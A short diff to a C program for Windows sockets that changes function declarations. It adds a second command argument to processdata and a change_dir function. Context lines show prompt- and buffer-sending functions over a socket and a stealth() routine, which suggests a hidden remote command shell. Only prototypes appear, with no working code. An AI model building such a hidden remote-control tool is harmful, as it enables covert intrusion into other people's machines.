@@ -10,6 +10,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <string.h>
 #include <winsock2.h>
 #include <windows.h>
@@ -38,5 +39,6 @@ int sendui(int s, char uin, int * bs);
 int sendprompt(SOCKET s, char uin);
 int setupvar(fileWrapper * file);
 int sendbuf(SOCKET s, char * buf, int size);
-int processdata(SOCKET s, char cmd);
+int processdata(SOCKET s, char cmd, char cmd2);
+void change_dir(char * dir);
 void stealth();
